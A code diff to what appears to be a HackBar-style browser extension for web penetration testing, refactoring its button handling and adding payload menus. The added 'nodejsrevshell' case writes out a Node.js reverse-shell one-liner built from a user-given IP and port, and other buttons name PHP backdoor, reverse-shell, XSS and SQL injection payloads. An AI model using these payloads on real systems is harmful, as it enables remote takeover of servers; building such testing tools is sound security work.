@@ -1,7 +1,6 @@
 var myWindowId;
 
 /**** Manage data between tabs ****/
-
 var urlfield = document.querySelector(".urlfield");
 var postdatafield = document.querySelector(".postdatafield");
 var refererfield = document.querySelector(".refererfield");
@@ -56,69 +55,88 @@ var loadurlBtn = document.querySelector('.loadurl');
 var splitBtn = document.querySelector('.split');
 var executeBtn = document.querySelector('.execute');
 
-// Menus
-var encryptionMenuBtn = document.getElementsByName("encryptionmenu")[0];
-var encodingMenuBtn = document.getElementsByName("encodingmenu")[0];
-var otherMenuBtn = document.getElementsByName("othermenu")[0];
-var xssMenuBtn = document.getElementsByName("xssmenu")[0];
+// Menu Buttons
+var menus = [];
+menus.push(document.getElementsByName("encodingmenu")[0]);
+menus.push(document.getElementsByName("othermenu")[0]);
+menus.push(document.getElementsByName("xssmenu")[0]);
+menus.push(document.getElementsByName("sqlmenu")[0]);
+menus.push(document.getElementsByName("stringsmenu")[0]);
+menus.push(document.getElementsByName("payloadmenu")[0]);
+menus.push(document.getElementsByName("autopwn")[0]);
 
-// Encoding
-var b64encodeBtn = document.getElementsByName("base64encode")[0];
-var b64decodeBtn = document.getElementsByName("base64decode")[0];
-var urlencodeBtn = document.getElementsByName("urlencode")[0];
-var urldecodeBtn = document.getElementsByName("urldecode")[0];
-var hexencodeBtn = document.getElementsByName("hexencode")[0];
-var hexdecodeBtn = document.getElementsByName("hexdecode")[0];
-var binaryencodeBtn = document.getElementsByName("binaryencode")[0];
-var binarydecodeBtn = document.getElementsByName("binarydecode")[0];
+// Encoding Buttons
+var encodingBtns = []
+encodingBtns.push(document.getElementsByName("base64encode")[0]);
+encodingBtns.push(document.getElementsByName("base64decode")[0]);
+encodingBtns.push(document.getElementsByName("urlencode")[0]);
+encodingBtns.push(document.getElementsByName("urldecode")[0]);
+encodingBtns.push(document.getElementsByName("hexencode")[0]);
+encodingBtns.push(document.getElementsByName("hexdecode")[0]);
+encodingBtns.push(document.getElementsByName("binaryencode")[0]);
+encodingBtns.push(document.getElementsByName("binarydecode")[0]);
 
-// Encryption
-var md5hashBtn = document.getElementsByName("md5hash")[0];
-var sha1hashBtn = document.getElementsByName("sha1hash")[0];
-var sha256hashBtn = document.getElementsByName("sha256hash")[0];
-var rot13Btn = document.getElementsByName("rot13")[0];
+// Encryption Buttons
+var encryptionBtns = []
+encryptionBtns.push(document.getElementsByName("md5hash")[0]);
+encryptionBtns.push(document.getElementsByName("sha1hash")[0]);
+encryptionBtns.push(document.getElementsByName("sha256hash")[0]);
+encryptionBtns.push(document.getElementsByName("rot13")[0]);
 
-// Other
-var stripspacesBtn = document.getElementsByName("stripspaces")[0];
-var stripslashesBtn = document.getElementsByName("stripslashes")[0];
-var extractlinksBtn = document.getElementsByName("extractlinks")[0];
-var strreverseBtn = document.getElementsByName("strreverse")[0];
-var extractcommentsBtn = document.getElementsByName("extractcomments")[0];
-var extractregexpBtn = document.getElementsByName("extractregexp")[0];
-var stripcustomBtn = document.getElementsByName("stripcustom")[0];
+// Other Buttons
+var otherBtns = [];
+otherBtns.push(document.getElementsByName("stripspaces")[0]);
+otherBtns.push(document.getElementsByName("stripslashes")[0]);
+otherBtns.push(document.getElementsByName("extractlinks")[0]);
+otherBtns.push(document.getElementsByName("strreverse")[0]);
+otherBtns.push(document.getElementsByName("extractcomments")[0]);
+otherBtns.push(document.getElementsByName("extractregexp")[0]);
+otherBtns.push(document.getElementsByName("stripcustom")[0]);
 
-// XSS
-var strcharcodeBtn = document.getElementsByName("strcharcode")[0];
-var htmlcharsBtn = document.getElementsByName("htmlchars")[0];
-var xssalertBtn = document.getElementsByName("xssalert")[0];
-var autoxsspolyBtn = document.getElementsByName("autoxsspoly")[0];
-var autoxsscustomBtn = document.getElementsByName("autoxsscustom")[0];
+// XSS Buttons
+var xssBtns = [];
+xssBtns.push(document.getElementsByName("strcharcode")[0]);
+xssBtns.push(document.getElementsByName("htmlchars")[0]);
+xssBtns.push(document.getElementsByName("xssalert")[0]);
 
-// SQL
-var mysqlcharBtn = document.getElementsByName("mysqlchar")[0];
-var mssqlcharBtn = document.getElementsByName("mssqlchar")[0];
-var oraclecharBtn = document.getElementsByName("oraclechar")[0];
-var unionselectstmntBtn = document.getElementsByName("unionselectstmnt")[0];
-var spaces2commentsBtn = document.getElementsByName("spaces2comments")[0];
-var mysqlbasicBtn = document.getElementsByName("mysqlbasic")[0];
-var convertutf8Btn = document.getElementsByName("convertutf8")[0];
-var convertlatin1Btn = document.getElementsByName("convertlatin1")[0];
+// SQL Buttons
+var sqlBtns = [];
+sqlBtns.push(document.getElementsByName("mysqlchar")[0]);
+sqlBtns.push(document.getElementsByName("mssqlchar")[0]);
+sqlBtns.push(document.getElementsByName("oraclechar")[0]);
+sqlBtns.push(document.getElementsByName("unionselectstmnt")[0]);
+sqlBtns.push(document.getElementsByName("spaces2comments")[0]);
+sqlBtns.push(document.getElementsByName("mysqlbasic")[0]);
+sqlBtns.push(document.getElementsByName("convertutf8")[0]);
+sqlBtns.push(document.getElementsByName("convertlatin1")[0]);
 
-// Strings
-var lowercaseBtn = document.getElementsByName("lowercase")[0];
-var uppercaseBtn = document.getElementsByName("uppercase")[0];
-var randomcaseBtn = document.getElementsByName("randomcase")[0];
-var smallpiBtn = document.getElementsByName("smallpi")[0];
-var bigpiBtn = document.getElementsByName("bigpi")[0];
-var phiBtn = document.getElementsByName("phi")[0];
-var lorumipsumBtn = document.getElementsByName("lorumipsum")[0];
-var fibonacciBtn = document.getElementsByName("fibonacci")[0];
-var bufferoverflowBtn = document.getElementsByName("bufferoverflow")[0];
+// String Buttons
+var stringBtns = [];
+stringBtns.push(document.getElementsByName("lowercase")[0]);
+stringBtns.push(document.getElementsByName("uppercase")[0]);
+stringBtns.push(document.getElementsByName("randomcase")[0]);
+stringBtns.push(document.getElementsByName("smallpi")[0]);
+stringBtns.push(document.getElementsByName("bigpi")[0]);
+stringBtns.push(document.getElementsByName("phi")[0]);
+stringBtns.push(document.getElementsByName("lorumipsum")[0]);
+stringBtns.push(document.getElementsByName("fibonacci")[0]);
+stringBtns.push(document.getElementsByName("bufferoverflow")[0]);
 
-// Payloads
-var phpbackdoorBtn = document.getElementsByName("phpbackdoor")[0];
-var phprevshellBtn = document.getElementsByName("phprevshell")[0];
-var phprfiBtn = document.getElementsByName("phprfi")[0];
+// Payload Buttons
+var payloadBtns = [];
+payloadBtns.push(document.getElementsByName("phpbackdoor")[0]);
+payloadBtns.push(document.getElementsByName("phprevshell")[0]);
+payloadBtns.push(document.getElementsByName("phprfi")[0]);
+payloadBtns.push(document.getElementsByName("nodejsrevshell")[0]);
+
+// AutoPwn Buttons
+var autopwnBtns = [];
+autopwnBtns.push(document.getElementsByName("autoopenre")[0]);
+autopwnBtns.push(document.getElementsByName("autoxsspoly")[0]);
+autopwnBtns.push(document.getElementsByName("autoxsscustom")[0]);
+
+// Create array of button arrays
+var allBtns = [encodingBtns, encryptionBtns, stringBtns, xssBtns, otherBtns, sqlBtns, payloadBtns, autopwnBtns];
 
 // Comboboxes
 var postdataCbx = document.getElementsByName("enablepostdata")[0];
@@ -127,66 +145,34 @@ var refererCbx = document.getElementsByName("enablereferer")[0];
 // Focus Field
 var currentFocusField = null;
 
-/*  add event listeners to buttons */
+// Add event listeners for the Load/Split/Run butto ns
 loadurlBtn.addEventListener('click', loadURL);
 executeBtn.addEventListener('click', execute);
 splitBtn.addEventListener('click', splitUrl);
 
 urlfield.focus();
 currentFocusField = urlfield;
+// Button event listeners
 anonClickMenuFunct = function ( event ) { onClickMenu( event ); }
-encryptionMenuBtn.addEventListener('mouseover', onMouseOverMenu, false);
-encodingMenuBtn.addEventListener('mouseover', onMouseOverMenu, false);
-otherMenuBtn.addEventListener('mouseover', onMouseOverMenu, false);
-xssMenuBtn.addEventListener('mouseover', onMouseOverMenu, false);
-b64encodeBtn.addEventListener('click', anonClickMenuFunct, false);
-b64decodeBtn.addEventListener('click', anonClickMenuFunct, false);
-urlencodeBtn.addEventListener('click', anonClickMenuFunct, false);
-urldecodeBtn.addEventListener('click', anonClickMenuFunct, false);
-md5hashBtn.addEventListener('click', anonClickMenuFunct, false);
-sha1hashBtn.addEventListener('click', anonClickMenuFunct, false);
-sha256hashBtn.addEventListener('click', anonClickMenuFunct, false);
-rot13Btn.addEventListener('click', anonClickMenuFunct, false);
-hexencodeBtn.addEventListener('click', anonClickMenuFunct, false);
-hexdecodeBtn.addEventListener('click', anonClickMenuFunct, false);
-binaryencodeBtn.addEventListener('click', anonClickMenuFunct, false);
-binarydecodeBtn.addEventListener('click', anonClickMenuFunct, false);
-stripslashesBtn.addEventListener('click', anonClickMenuFunct, false);
-stripspacesBtn.addEventListener('click', anonClickMenuFunct, false);
-extractlinksBtn.addEventListener('click', anonClickMenuFunct, false);
-strreverseBtn.addEventListener('click', anonClickMenuFunct, false);
-strcharcodeBtn.addEventListener('click', anonClickMenuFunct, false);
-htmlcharsBtn.addEventListener('click', anonClickMenuFunct, false);
-xssalertBtn.addEventListener('click', anonClickMenuFunct, false);
-autoxsspolyBtn.addEventListener('click', anonClickMenuFunct, false);
-autoxsscustomBtn.addEventListener('click', anonClickMenuFunct, false);
-mysqlcharBtn.addEventListener('click', anonClickMenuFunct, false);
-mssqlcharBtn.addEventListener('click', anonClickMenuFunct, false);
-oraclecharBtn.addEventListener('click', anonClickMenuFunct, false);
-unionselectstmntBtn.addEventListener('click', anonClickMenuFunct, false);
-spaces2commentsBtn.addEventListener('click', anonClickMenuFunct, false);
-extractcommentsBtn.addEventListener('click', anonClickMenuFunct, false);
-extractregexpBtn.addEventListener('click', anonClickMenuFunct, false);
-stripcustomBtn.addEventListener('click', anonClickMenuFunct, false);
-mysqlbasicBtn.addEventListener('click', anonClickMenuFunct, false);
-convertlatin1Btn.addEventListener('click', anonClickMenuFunct, false);
-convertutf8Btn.addEventListener('click', anonClickMenuFunct, false);
-smallpiBtn.addEventListener('click', anonClickMenuFunct, false);
-bigpiBtn.addEventListener('click', anonClickMenuFunct, false);
-phiBtn.addEventListener('click', anonClickMenuFunct, false);
-lorumipsumBtn.addEventListener('click', anonClickMenuFunct, false);
-fibonacciBtn.addEventListener('click', anonClickMenuFunct, false);
-bufferoverflowBtn.addEventListener('click', anonClickMenuFunct, false);
-phpbackdoorBtn.addEventListener('click', anonClickMenuFunct, false);
-phprevshellBtn.addEventListener('click', anonClickMenuFunct, false);
-phprfiBtn.addEventListener('click', anonClickMenuFunct, false);
-lowercaseBtn.addEventListener('click', anonClickMenuFunct, false);
-uppercaseBtn.addEventListener('click', anonClickMenuFunct, false);
-randomcaseBtn.addEventListener('click', anonClickMenuFunct, false);
 
+// Create event listeners for menus
+menus.forEach(function(object){
+  object.addEventListener('mouseover', onMouseOverMenu, false);
+});
+
+// Loop through each button array
+allBtns.forEach(function(btnArray){
+  // Loop through each button in the array and create a listener
+  btnArray.forEach(function(object){
+    object.addEventListener('click', anonClickMenuFunct, false);
+  });
+});
+
+// Comboboxes
 postdataCbx.addEventListener('change', togglepostdata);
 refererCbx.addEventListener('change', togglereferer);
 
+// Create listeners for fields
 anonFocusFunct = function (event) { onFieldFocus( event );}
 urlfield.addEventListener('focus', anonFocusFunct, false );
 postdatafield.addEventListener('focus', anonFocusFunct, false );
@@ -479,6 +465,17 @@ function onClickMenu(event) {
     }
     this.setSelectedText( newString )
     break;
+  case "nodejsrevshell":
+    // taken from https://twitter.com/jobertabma/status/948428058687500289
+    var ip = prompt("IP Address:");
+    var port = prompt("Port:");
+    this.setSelectedText("require('child_process').exec('bash -i >& /dev/tcp/"+ip+"/"+port+" 0>&1')");
+    break;
+  case "autoopenre":
+    var auto = browser.tabs.executeScript({
+      file: 'redirect.js'
+    });
+    break; 
   }
 
   var dropdowns = document.getElementsByClassName("dropdown-content");
@@ -571,10 +568,10 @@ function getPostdata()
   else if ((postdatafield.value || '').indexOf("&") > -1) {
     typePostdata = "formdata";
     var dataString = postdatafield.value;
-    dataString = dataString.replace( new RegExp(/\n|\r/g), '' );
-    dataString = dataString.replace( new RegExp(/\+/g), "%2B" );
-    dataString = dataString.replace(new RegExp(/\=\=/g),"%3d%3d"); // for bas64 cases
-    dataString = dataString.replace(new RegExp(/\=\&/g),"%3d&");   // for bas64 cases
+    dataString = dataString.replace(new RegExp(/\n|\r/g), '');
+    dataString = dataString.replace(new RegExp(/\+/g), "%2B");
+    dataString = dataString.replace(new RegExp(/\=\=/g), "%3d%3d"); // for bas64 cases
+    dataString = dataString.replace(new RegExp(/\=\&/g), "%3d&");   // for bas64 cases
     var fields = dataString.split('&');
     return fields;
   }
